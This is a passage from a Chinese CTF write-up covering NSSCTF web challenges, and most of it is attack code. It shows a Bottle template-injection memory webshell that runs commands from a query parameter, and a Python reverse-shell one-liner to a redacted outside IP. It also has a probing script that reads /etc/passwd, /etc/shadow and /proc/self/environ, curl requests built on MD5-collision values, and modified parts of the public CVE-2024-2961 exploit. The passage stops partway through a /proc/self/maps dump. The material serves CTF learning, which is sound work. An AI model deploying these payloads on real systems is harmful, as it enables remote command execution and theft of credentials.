__import__('os') 动态导入 os 模块，__import__ 是 Python 内置的用于动态导入模块的函数。</span><span class="token comment">#调用 os.popen 函数执行一个系统命令。</span><span class="token comment">#使用 read() 方法读取 os.popen 执行命令后的输出结果，并通过 print 函数打印出来</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>依然没有接收到，判断可能不出网，使用sleep进行盲注</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token operator">&lt;</span>/div<span class="token operator">&gt;</span>% __import__<span class="token punctuation">(</span><span class="token string">"time"</span><span class="token punctuation">)</span>.sleep<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span> <span class="token keyword">if</span> open<span class="token punctuation">(</span><span class="token string">"/flag"</span><span class="token punctuation">)</span>.read<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token operator">==</span><span class="token string">'N'</span> <span class="token keyword">else</span> <span class="token number">1</span><span class="token operator">&lt;</span>div<span class="token operator">&gt;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>产生延时，的确可行，逐位爆破即可，先猜个前7位:<code>NSSCTF{</code></p><p>然后就是爆破了，使用BP进行逐位半自动爆破(逻辑有点复杂，不会写脚本)，注意BP默认多线程爆破，不容易判断在哪一次上传后产生延时，将线程改为1即可，字典使用<code>abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789{}_!@#$%^&amp;*()-+</code>,然后将每一次上传时第一个产生延时的字符填入对应的flag位置即可(注意环境重启flag会切换，中间换环境了要重新开始，<del>我就中间换了环境导致flag不对卡半天</del>)，每判断一位清理一次留言板。</p><p>最终得到flag</p><blockquote><p>NSSCTF{6b3d59cb-29a4-451b-ac74-6abc607ea182}</p></blockquote><p>​                                                                                                                                                                                                        —-xianxin</p><p>内存马：</p><p><a href="https://forum.butian.net/share/4048">奇安信攻防社区-探寻Bottle框架内存马</a></p><p><a href="https://research.qianxin.com/archives/2329">Python Web内存马多框架植入技术详解 – 奇安信技术研究院</a></p><p><a href="https://www.osgeo.cn/bottle/stpl.html">SimpleTemplate 模板引擎 — Bottle 0.13-dev 文档</a></p><p><img src="https://cdn.jsdelivr.net/gh/lingqing777/Cloud-Image-Hosting/cc3cfb29ac910fa1b973256852a25e12.png"></p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment">#内存马</span><span class="token operator">%</span> <span class="token keyword">from</span> bottle <span class="token keyword">import</span> Bottle<span class="token punctuation">,</span> request<span class="token operator">%</span> app<span class="token operator">=</span><span class="token builtin">__import__</span><span class="token punctuation">(</span><span class="token string">'sys'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>modules<span class="token punctuation">[</span><span class="token string">'__main__'</span><span class="token punctuation">]</span><span class="token punctuation">.</span>__dict__<span class="token punctuation">[</span><span class="token string">'app'</span><span class="token punctuation">]</span><span class="token operator">%</span> app<span class="token punctuation">.</span>route<span class="token punctuation">(</span><span class="token string">"/shell"</span><span class="token punctuation">,</span><span class="token string">"GET"</span><span class="token punctuation">,</span><span class="token keyword">lambda</span> <span class="token punctuation">:</span><span class="token builtin">__import__</span><span class="token punctuation">(</span><span class="token string">'os'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>popen<span class="token punctuation">(</span>request<span class="token punctuation">.</span>params<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">'lalala'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment">#从 bottle 框架中导入 Bottle 类和 request 对象。Bottle 类用于创建 Web 应用，request 对象用于获取客户端请求的相关信息。</span><span class="token comment">#使用 __import__('sys') 动态导入 sys 模块，通过 sys.modules['__main__'] 获取主模块，再从主模块的命名空间（__dict__）中获取名为 app 的 Bottle 应用实例。(通过 sys 模块获取主模块的命名空间，从中提取出已存在的 Bottle 应用实例 app。)</span><span class="token comment">#为 Bottle 应用添加一个新的路由 /shell，该路由处理 GET 请求。当客户端访问 /shell 时，会执行一个匿名函数。这个匿名函数的功能是：</span><span class="token comment">#使用 request.params.get('lalala') 从请求的查询参数中获取名为 lalala 的值。</span><span class="token comment">#使用 __import__('os') 动态导入 os 模块，然后调用 os.popen 函数执行从查询参数中获取的值作为系统命令。</span><span class="token comment">#最后读取命令执行的输出结果并返回给客户端。</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment">#弹shell</span><span class="token operator">%</span><span class="token builtin">__import__</span><span class="token punctuation">(</span><span class="token string">'os'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>popen<span class="token punctuation">(</span>"python3 <span class="token operator">-</span>c '<span class="token keyword">import</span> os<span class="token punctuation">,</span>pty<span class="token punctuation">,</span>socket<span class="token punctuation">;</span>s<span class="token operator">=</span>socket<span class="token punctuation">.</span>socket<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>s<span class="token punctuation">.</span>connect<span class="token punctuation">(</span><span class="token punctuation">(</span>\"<span class="token number">111</span><span class="token punctuation">.</span>xxx<span class="token punctuation">.</span>xxx<span class="token punctuation">.</span>xxx\"<span class="token punctuation">,</span><span class="token number">7777</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">[</span>os<span class="token punctuation">.</span>dup2<span class="token punctuation">(</span>s<span class="token punctuation">.</span>fileno<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span>f<span class="token punctuation">)</span><span class="token keyword">for</span> f <span class="token keyword">in</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">;</span>pty<span class="token punctuation">.</span>spawn<span class="token punctuation">(</span>\<span class="token string">"sh\")'"</span><span class="token punctuation">)</span><span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span>             <span class="token triple-quoted-string string">"""python3 -c：这是 Python 命令行选项，用于直接执行后面单引号内的 Python 代码。import os,pty,socket：导入 os、pty 和 socket 模块。os 模块提供了与操作系统进行交互的功能；pty 模块用于创建伪终端；socket 模块用于网络通信。s = socket.socket()：创建一个 TCP 套接字对象 s。s.connect(("111.xxx.xxx.xxx", 7777))：尝试连接到指定 IP 地址（111.xxx.xxx.xxx）和端口（7777）的远程服务器。[os.dup2(s.fileno(), f) for f in (0, 1, 2)]：s.fileno() 返回套接字对象 s 的文件描述符。os.dup2 函数用于复制文件描述符，这里将标准输入（文件描述符 0）、标准输出（文件描述符 1）和标准错误（文件描述符 2）都重定向到套接字 s。这样，后续的输入输出操作都会通过网络套接字进行。pty.spawn("sh")：启动一个新的 shell 进程（这里是 sh），并将其与之前重定向的标准输入、输出和错误关联起来。这样，攻击者在远程服务器上就可以通过这个套接字控制目标系统的 shell，实现反弹 shell 的效果。"""</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><hr><h3 id="ez-readfile-2"><a href="#ez-readfile-2" class="headerlink" title="ez_readfile(2)"></a>ez_readfile(2)</h3><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> requestsTARGET_URL <span class="token operator">=</span> <span class="token string">"http://node1.anna.nssctf.cn:28067/"</span>POST_DATA <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token comment">#POST 请求携带的数据。</span>  <span class="token string">"a"</span><span class="token punctuation">:</span> <span class="token string">"TEXTCOLLBYfGiJUETHQ4hAcKSMd5zYpgqf1YRDhkmxHkhPWptrkoyz28wnI9V0aHeAuaKnak"</span><span class="token punctuation">,</span>  <span class="token string">"b"</span><span class="token punctuation">:</span> <span class="token string">"TEXTCOLLBYfGiJUETHQ4hEcKSMd5zYpgqf1YRDhkmxHkhPWptrkoyz28wnI9V0aHeAuaKnak"</span><span class="token punctuation">}</span>TEST_PATHS <span class="token operator">=</span> <span class="token punctuation">[</span>  <span class="token string">"/flag"</span><span class="token punctuation">,</span>  <span class="token comment"># 绝对路径</span>  <span class="token string">"../../../../flag"</span><span class="token punctuation">,</span>  <span class="token comment"># 路径遍历</span>  <span class="token string">"/flag.txt"</span><span class="token punctuation">,</span> <span class="token comment"># 常见扩展名</span>  <span class="token string">"/etc/passwd"</span><span class="token punctuation">,</span>  <span class="token string">"/app/flag"</span><span class="token punctuation">,</span>  <span class="token string">"/run/secrets/flag"</span><span class="token punctuation">,</span>  <span class="token string">"/opt/flag"</span><span class="token punctuation">,</span>  <span class="token string">"/usr/local/flag"</span><span class="token punctuation">,</span>  <span class="token string">"/docker-entrypoint.sh"</span><span class="token punctuation">,</span>  <span class="token string">"/tmp/flag"</span><span class="token punctuation">,</span>  <span class="token string">"tmp/flag.tmp"</span><span class="token punctuation">,</span>  <span class="token string">"/var/tmp/flag"</span><span class="token punctuation">,</span>  <span class="token string">"/var/log/apache2/access.log"</span><span class="token punctuation">,</span>  <span class="token string">"/var/log/nginx/access.log"</span><span class="token punctuation">,</span>  <span class="token string">"/var/log/auth.log"</span><span class="token punctuation">,</span>  <span class="token string">"/var/log/syslog"</span><span class="token punctuation">,</span>  <span class="token string">"/var/www/html/index.php"</span><span class="token punctuation">,</span>  <span class="token string">"/var/www/html/config.php"</span><span class="token punctuation">,</span>  <span class="token string">"/var/www/html/.env"</span><span class="token punctuation">,</span>  <span class="token string">"/var/www/html/admin/flag"</span><span class="token punctuation">,</span>  <span class="token string">"/var/www/html/uploads/flag"</span><span class="token punctuation">,</span>  <span class="token string">"/var/www/html/secret/flag"</span><span class="token punctuation">,</span>  <span class="token string">"/var/www/html/robots.txt"</span><span class="token punctuation">,</span>  <span class="token string">"/var/backups/flag"</span><span class="token punctuation">,</span>  <span class="token string">"/var/backups/flag.bak"</span><span class="token punctuation">,</span>  <span class="token string">"/var/backups/app.tar.gz"</span><span class="token punctuation">,</span>  <span class="token string">"/var/lib/gnats/flag"</span><span class="token punctuation">,</span>  <span class="token string">"/home/flag"</span><span class="token punctuation">,</span>  <span class="token string">"/home/user/flag"</span><span class="token punctuation">,</span>  <span class="token string">"/etc/shadow"</span><span class="token punctuation">,</span>  <span class="token string">"/etc/flag"</span><span class="token punctuation">,</span>  <span class="token string">"/etc/motd"</span><span class="token punctuation">,</span>  <span class="token string">"/etc/hosts"</span><span class="token punctuation">,</span>  <span class="token string">"/etc/environment"</span><span class="token punctuation">,</span>  <span class="token string">"/proc/self/environ"</span><span class="token punctuation">,</span>  <span class="token string">"/proc/version"</span><span class="token punctuation">,</span>  <span class="token string">"/tmp/flag"</span><span class="token punctuation">,</span>  <span class="token string">"/tmp/flag.tmp"</span><span class="token punctuation">,</span>  <span class="token string">"/var/tmp/flag"</span><span class="token punctuation">,</span>  <span class="token string">"/var/log/apache2/access.log"</span><span class="token punctuation">,</span>  <span class="token string">"/var/log/nginx/access.log"</span><span class="token punctuation">,</span>  <span class="token string">"/var/log/auth.log"</span><span class="token punctuation">,</span>  <span class="token string">"/var/log/syslog"</span><span class="token punctuation">,</span>  <span class="token string">"/flag.bak"</span><span class="token punctuation">,</span>  <span class="token string">"/flag.old"</span><span class="token punctuation">,</span>  <span class="token string">"/flag.swp"</span><span class="token punctuation">,</span>  <span class="token string">"/flag.swo"</span><span class="token punctuation">,</span>  <span class="token string">".flag"</span><span class="token punctuation">,</span>  <span class="token string">".flag.txt"</span><span class="token punctuation">,</span>  <span class="token string">".flag.php"</span><span class="token punctuation">,</span>  <span class="token string">"._flag"</span><span class="token punctuation">,</span>  <span class="token string">"/readme.md"</span><span class="token punctuation">,</span>  <span class="token string">"/notice.txt"</span><span class="token punctuation">,</span>  <span class="token string">"/hint.txt"</span><span class="token punctuation">,</span>  <span class="token string">"/secret"</span><span class="token punctuation">,</span>  <span class="token string">"/admin/flag"</span><span class="token punctuation">,</span>  <span class="token string">"/api/flag"</span><span class="token punctuation">,</span>  <span class="token string">"/v1/flag"</span><span class="token punctuation">]</span><span class="token keyword">def</span> <span class="token function">test_paths</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">for</span> path <span class="token keyword">in</span> TEST_PATHS<span class="token punctuation">:</span>        params<span class="token operator">=</span><span class="token punctuation">{</span><span class="token string">"file"</span><span class="token punctuation">:</span>path<span class="token punctuation">}</span><span class="token comment">#为每个路径创建一个包含 file 参数的字典 params。</span>        <span class="token keyword">try</span><span class="token punctuation">:</span>            response<span class="token operator">=</span>requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span>                TARGET_URL<span class="token punctuation">,</span>                data<span class="token operator">=</span>POST_DATA<span class="token punctuation">,</span>                params<span class="token operator">=</span>params<span class="token punctuation">,</span>                timeout<span class="token operator">=</span><span class="token number">5</span>            <span class="token punctuation">)</span>            <span class="token keyword">if</span> response<span class="token punctuation">.</span>status_code<span class="token operator">==</span><span class="token number">200</span><span class="token punctuation">:</span>                <span class="token keyword">if</span> <span class="token string">"NSSCTF{"</span> <span class="token keyword">in</span> response<span class="token punctuation">.</span>text<span class="token punctuation">:</span>                    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"[+]成功获取 Flag:</span><span class="token interpolation"><span class="token punctuation">{</span>response<span class="token punctuation">.</span>text<span class="token punctuation">}</span></span><span class="token string">"</span></span><span class="token punctuation">)</span>                    <span class="token keyword">return</span>                <span class="token keyword">elif</span> <span class="token string">"Warning"</span> <span class="token keyword">in</span> response<span class="token punctuation">.</span>text<span class="token punctuation">:</span>                    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"Warning"</span><span class="token punctuation">)</span>                <span class="token keyword">else</span><span class="token punctuation">:</span>                    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"No Warning:</span><span class="token interpolation"><span class="token punctuation">{</span>path<span class="token punctuation">}</span></span><span class="token string">"</span></span><span class="token punctuation">)</span>        <span class="token keyword">except</span> Exception <span class="token keyword">as</span> e<span class="token punctuation">:</span>            <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"[!]测试</span><span class="token interpolation"><span class="token punctuation">{</span>path<span class="token punctuation">}</span></span><span class="token string">时出错：</span><span class="token interpolation"><span class="token punctuation">{</span><span class="token builtin">str</span><span class="token punctuation">(</span>e<span class="token punctuation">)</span><span class="token punctuation">}</span></span><span class="token string">"</span></span><span class="token punctuation">)</span><span class="token keyword">if</span> __name__<span class="token operator">==</span><span class="token string">"__main__"</span><span class="token punctuation">:</span>    <span class="token comment">#当脚本作为主程序运行时，调用 test_paths 函数开始测试。</span>    test_paths<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><a href="https://www.cnblogs.com/4sh3s/p/15551544.html">CTF中文件读取漏洞常见读取路径 - 4sh3s - 博客园</a></p><pre class="line-numbers language-python" data-language="python"><code class="language-python">curl <span class="token operator">-</span>X POST http<span class="token punctuation">:</span><span class="token operator">//</span>node1<span class="token punctuation">.</span>anna<span class="token punctuation">.</span>nssctf<span class="token punctuation">.</span>cn<span class="token punctuation">:</span><span class="token number">28067</span><span class="token operator">/</span>?<span class="token builtin">file</span><span class="token operator">=</span><span class="token operator">/</span>docker<span class="token operator">-</span>entrypoint<span class="token punctuation">.</span>sh <span class="token operator">-</span>d <span class="token string">"a=M%C9h%FF%0E%E3%5C%20%95r%D4w%7Br%15%87%D3o%A7%B2%1B%DCV%B7J%3D%C0x%3E%7B%95%18%AF%BF%A2%00%A8%28K%F3n%8EKU%B3_Bu%93%D8Igm%A0%D1U%5D%83%60%FB_%07%FE%A2&amp;b=M%C9h%FF%0E%E3%5C%20%95r%D4w%7Br%15%87%D3o%A7%B2%1B%DCV%B7J%3D%C0x%3E%7B%95%18%AF%BF%A2%02%A8%28K%F3n%8EKU%B3_Bu%93%D8Igm%A0%D1%D5%5D%83%60%FB_%07%FE%A2"</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://cdn.jsdelivr.net/gh/lingqing777/Cloud-Image-Hosting/36143b34c3bd405a66e5f326ef1a7244.png"></p><p><img src="https://cdn.jsdelivr.net/gh/lingqing777/Cloud-Image-Hosting/aa2e2d35157574b63788c25d2e1e6b25.png"></p><p>or CVE-2024-2961漏洞原：<a href="https://github.com/ambionics/cnext-exploits/blob/main/cnext-exploit.py">cnext-exploits/cnext-exploit.py at main · ambionics/cnext-exploits</a></p><blockquote><p>在这⾥只需要修改(如果我没记错的话)send函数（请求包的参数设置），download函数（内容的正则匹 配），将check_vulnerable函数中的部分failure函数的调⽤换成pass（使⽤时，会吞字符，但不影响漏 洞利⽤。具体原因笔者太菜，不清楚），即可正常运⾏脚本。</p></blockquote><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">def</span> <span class="token function">send</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> path<span class="token punctuation">:</span> <span class="token builtin">str</span><span class="token punctuation">)</span> <span class="token operator">-</span><span class="token operator">&gt;</span> Response<span class="token punctuation">:</span>        <span class="token keyword">return</span> self<span class="token punctuation">.</span>session<span class="token punctuation">.</span>post<span class="token punctuation">(</span>            self<span class="token punctuation">.</span>url<span class="token punctuation">,</span>            params<span class="token operator">=</span><span class="token punctuation">{</span><span class="token string">"file"</span><span class="token punctuation">:</span> path<span class="token punctuation">}</span><span class="token punctuation">,</span>            data<span class="token operator">=</span><span class="token punctuation">{</span>                <span class="token string">"a"</span><span class="token punctuation">:</span> b64decode<span class="token punctuation">(</span><span class="token string">"cHN5Y2hvCgAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAFetWq88ihNWtZYYbaXqMoFf+9kkIi+P1ESiN3ZYuAjXbSzg1ExS1/tvEHQZAoJ9eyubdAX/bK6NRfQfhDyuAQ+bEtSBpUr5SA95RSrcK7G0D95jQ0DaMjmLwwB/i19oxtOLZDivhXwUdwbCOkO8DBv9u5jOFs63tjrzmbU5+f/C"</span><span class="token punctuation">)</span><span class="token punctuation">,</span>                <span class="token string">"b"</span><span class="token punctuation">:</span> b64decode<span class="token punctuation">(</span><span class="token string">"cHN5Y2hvCgAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAFetWq88ihNWtZYYbaXqMoFf+9mkIi+P1ESiN3ZYuAjXbSzg1ExS1/tvEHQZAgJ+eyubdAX/bK6NRfQfBDyuAQ+bEtSBpUr5SA95RSrcK7G0D95jw0DaMjmLwwB/i19oxtOLZDivhXwUdwbCOkM8DBv9u5jOFs63tjrzmTU5+f/C"</span><span class="token punctuation">)</span>            <span class="token punctuation">}</span><span class="token punctuation">,</span>            headers<span class="token operator">=</span><span class="token punctuation">{</span><span class="token string">"Content-Type"</span><span class="token punctuation">:</span> <span class="token string">"application/x-www-form-urlencoded"</span><span class="token punctuation">}</span>        <span class="token punctuation">)</span>    <span class="token keyword">def</span> <span class="token function">download</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> path<span class="token punctuation">:</span> <span class="token builtin">str</span><span class="token punctuation">)</span> <span class="token operator">-</span><span class="token operator">&gt;</span> <span class="token builtin">bytes</span><span class="token punctuation">:</span>        <span class="token triple-quoted-string string">"""Returns the contents of a remote file.        """</span>        path <span class="token operator">=</span> <span class="token string-interpolation"><span class="token string">f"php://filter/convert.base64-encode/resource=</span><span class="token interpolation"><span class="token punctuation">{</span>path<span class="token punctuation">}</span></span><span class="token string">"</span></span>        response <span class="token operator">=</span> self<span class="token punctuation">.</span>send<span class="token punctuation">(</span>path<span class="token punctuation">)</span>        data <span class="token operator">=</span> response<span class="token punctuation">.</span>re<span class="token punctuation">.</span>search<span class="token punctuation">(</span><span class="token string">b"&lt;\/code&gt;([\s\S]*)"</span><span class="token punctuation">,</span> flags<span class="token operator">=</span>re<span class="token punctuation">.</span>S<span class="token punctuation">)</span><span class="token punctuation">.</span>group<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>        <span class="token keyword">print</span><span class="token punctuation">(</span>response<span class="token punctuation">.</span>text<span class="token punctuation">)</span>        <span class="token keyword">return</span> base64<span class="token punctuation">.</span>decode<span class="token punctuation">(</span>data<span class="token punctuation">)</span><span class="token decorator annotation punctuation">@entry</span><span class="token decorator annotation punctuation">@arg</span><span class="token punctuation">(</span><span class="token string">"url"</span><span class="token punctuation">,</span> <span class="token string">"Target URL"</span><span class="token punctuation">)</span><span class="token decorator annotation punctuation">@arg</span><span class="token punctuation">(</span><span class="token string">"command"</span><span class="token punctuation">,</span> <span class="token string">"Command to run on the system; limited to 0x140 bytes"</span><span class="token punctuation">)</span><span class="token decorator annotation punctuation">@arg</span><span class="token punctuation">(</span><span class="token string">"sleep_time"</span><span class="token punctuation">,</span> <span class="token string">"Time to sleep to assert that the exploit worked. By default, 1."</span><span class="token punctuation">)</span><span class="token decorator annotation punctuation">@arg</span><span class="token punctuation">(</span><span class="token string">"heap"</span><span class="token punctuation">,</span> <span class="token string">"Address of the main zend_mm_heap structure."</span><span class="token punctuation">)</span><span class="token decorator annotation punctuation">@arg</span><span class="token punctuation">(</span>    <span class="token string">"pad"</span><span class="token punctuation">,</span>    <span class="token string">"Number of 0x100 chunks to pad with. If the website makes a lot of heap "</span>    <span class="token string">"operations with this size, increase this. Defaults to 20."</span><span class="token punctuation">,</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><blockquote><p>kezibei脚本</p><p><a href="https://github.com/kezibei/php-filter-iconv">https://github.com/kezibei/php-filter-iconv</a>  该脚本只要当前⽬录中有⽬标靶机的/proc/self/maps和libc.so⽂件，即可将payload跑出来，让我们⾃ ⼰去运⾏。 payload会随着当前maps的变化⽽变化，因此payload并不是固定的</p></blockquote><p><a href="https://github.com/kezibei/php-filter-iconv?tab=readme-ov-file">https://github.com/kezibei/php-filter-iconv?tab=readme-ov-file</a></p><p><a href="https://xyaxxya.github.io/posts/2b7eb6e9.html#ez-readfile">https://xyaxxya.github.io/posts/2b7eb6e9.html#ez-readfile</a></p><p><a href="https://www.nssctf.cn/note/set/11874">https://www.nssctf.cn/note/set/11874</a></p><blockquote><p>通过任意文件下载获取目标的/proc/self/maps和libc-2.x.so，在本机和php-filter-iconv.py放在同目录，然后运行脚本即可生成php://filter/的RCE payload，详细参数调整如下代码即可。</p><p>…….<br>maps_path = ‘./maps’<br>cmd = ‘echo 123 &gt; 1.txt’<br>sleep_time = 1<br>padding = 20</p><p>if not os.path.exists(maps_path):<br>    exit(“[-]no maps file”)</p><p>regions = get_regions(maps_path)<br>heap, libc_info = get_symbols_and_addresses(regions)</p><p>libc_path = libc_info.path<br>print(“[*]download: “+libc_path)</p><p>libc_path = ‘./libc-2.23.so’<br>…….</p></blockquote><pre class="line-numbers language-none"><code class="language-none">curl -X POST http://node1.anna.nssctf.cn:28468/?file=/proc/self/maps -d "a=M%C9h%FF%0E%E3%5C%20%95r%D4w%7Br%15%87%D3o%A7%B2%1B%DCV%B7J%3D%C0x%3E%7B%95%18%AF%BF%A2%00%A8%28K%F3n%8EKU%B3_Bu%93%D8Igm%A0%D1U%5D%83%60%FB_%07%FE%A2&amp;b=M%C9h%FF%0E%E3%5C%20%95r%D4w%7Br%15%87%D3o%A7%B2%1B%DCV%B7J%3D%C0x%3E%7B%95%18%AF%BF%A2%02%A8%28K%F3n%8EKU%B3_Bu%93%D8Igm%A0%D1%D5%5D%83%60%FB_%07%FE%A2"<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><pre class="line-numbers language-none"><code class="language-none">55d9ac153000-55d9ac18b000 r--p 00000000 00:39 2658390                    /usr/sbin/apache255d9ac18b000-55d9ac1da000 r-xp 00038000 00:39 2658390                    /usr/sbin/apache255d9ac1da000-55d9ac1fe000 r--p 00087000 00:39 2658390                    /usr/sbin/apache255d9ac1fe000-55d9ac202000 r--p 000aa000 00:39 2658390                    /usr/sbin/apache255d9ac202000-55d9ac206000 rw-p 000ae000 00:39 2658390                    /usr/sbin/apache255d9ac206000-55d9ac20a000 rw-p 00000000 00:00 055d9ad330000-55d9ad4f9000 rw-p 00000000 00:00 0                          [heap]7fce5d8fd000-7fce5d8fe000 r--p 00000000 00:39 2658353                    /usr/lib/x86_64-linux-gnu/libicudata.so.67.17fce5d8fe000-7fce5d8ff000 r-xp 00001000 00:39 2658353                    /usr/lib/x86_64-linux-gnu/libicudata.so.67.17fce5d8ff000-7fce5f414000 r--p 00002000 00:39 2658353                    /usr/lib/x86_64-linux-gnu/libicudata.so.67.17fce5f414000-7fce5f415000 r--p 01b16000 00:39 2658353                    /usr/lib/x86_64-linux-gnu/libicudata.so.67.17fce5f415000-7fce5f416000 rw-p 01b17000 00:39 2658353                    /usr/lib/x86_64-linux-gnu/libicudata.so.67.17fce5f416000-7fce5f45a000 rw-p 00000000 00:00 07fce5f45a000-7fce5f45d000 r--p 00000000 00:39 2650544                    /lib/x86_64-linux-gnu/libnss_files-2.31.so7fce5f45d000-7fce5f464000 r-xp 00003000 00:39 2650544                    /lib/x86_64-linux-gnu/libnss_files-2.31.so7fce5f464000-7fce5f466000 r--p 0000a000 00:39 2650544                    /lib/x86_64-linux-gnu/libnss_files-2.31.so7fce5f466000-7fce5f467000 r--p 0000b000 00:39 2650544                    /lib/x86_64-linux-gnu/libnss_files-2.31.so7fce5f467000-7fce5f468000 rw-p 0000c000 00:39 2650544                    /lib/x86_64-linux-gnu/libnss_files-2.31.so7fce5f468000-7fce5f49e000 rw-p 00000000 00:00 07fce5f4a6000-7fce5f4a8000 rw-p 00000000 00:00 07fce5f4ae000-7fce5f4b0000 rw-p 00000000 00:00 07fce5fd60000-7fce5fd63000 r--p 00000000 00:39 2650526                    /lib/x86_64-linux-gnu/libgcc_s.so.17fce5fd63000-7fce5fd74000 r-xp 00003000 00:39 2650526                    /lib/x86_64-linux-gnu/libgcc_s.so.17fce5fd74000-7fce5fd78000 r--p 00014000 00:39 2650526                    /lib/x86_64-linux-gnu/libgcc_s.so.17fce5fd78000-7fce5fd79000 r--p 00017000 00:39 2650526                    /lib/x86_64-linux-gnu/libgcc_s.so.17fce5fd79000-7fce5fd7a000 rw-p 00018000 00:39 2650526                    /lib/x86_64-linux-gnu/libgcc_s.so.17fce5fd7a000-7fce5fe10000 r--p 00000000 00:39 2651288                    /usr/lib/x86_64-linux-gnu/libstdc++.so.6.0.287fce5fe10000-7fce5feec000 r-xp 00096000 00:39 2651288                    /usr/lib/x86_64-linux-gnu/libstdc++.so.6.0.287fce5feec000-7fce5ff36000 r--p 00172000 00:39 2651288                    /usr/lib/x86_64-linux-gnu/libstdc++.so.6.0.287fce5ff36000-7fce5ff41000 r--p 001bb000 00:39 2651288                    /usr/lib/x86_64-linux-gnu/libstdc++.so.6.0.287fce5ff41000-7fce5ff44000 rw-p 001c6000 00:39 2651288                    /usr/lib/x86_64-linux-gnu/libstdc++.so.6.0.287fce5ff44000-7fce5ff47000 rw-p 00000000 00:00 07fce60e00000-7fce61000000 rw-p 00000000 00:00 07fce61054000-7fce610d5000 rw-p 00000000 00:00 07fce610d5000-7fce610e1000 r--p 00000000 00:39 2659076                    /usr/lib/x86_64-linux-gnu/libsodium.so.23.3.07fce610e1000-7fce6111a000 r-xp 0000c000 00:39 2659076                    /usr/lib/x86_64-linux-gnu/libsodium.so.23.3.07fce6111a000-7fce6112c000 r--p 00045000 00:39 2659076                    /usr/lib/x86_64-linux-gnu/libsodium.so.23.3.07fce6112c000-7fce6112d000 ---p 00057000 00:39 2659076                    /usr/lib/x86_64-linux-gnu/libsodium.so.23.3.07fce6112d000-7fce6112e000 r--p 00057000 00:39 2659076                    /usr/lib/x86_64-linux-gnu/libsodium.so.23.3.07fce6112e000-7fce6112f000 rw-p 00058000 00:39 2659076                    /usr/lib/x86_64-linux-gnu/libsodium.so.23.3.07fce6112f000-7fce61246000 r--p 00000000 00:39 2659069                    /usr/lib/apache2/modules/libphp7.so7fce61246000-7fce615fd000 r-xp 00117000 00:39 2659069                    /usr/lib/apache2/modules/libphp7.so7fce615fd000-7fce61de1000 r--p 004ce000 00:39 2659069                    /usr/lib/apache2/modules/libphp7.so7fce61de1000-7fce61de2000 ---p 00cb2000 00:39 2659069                    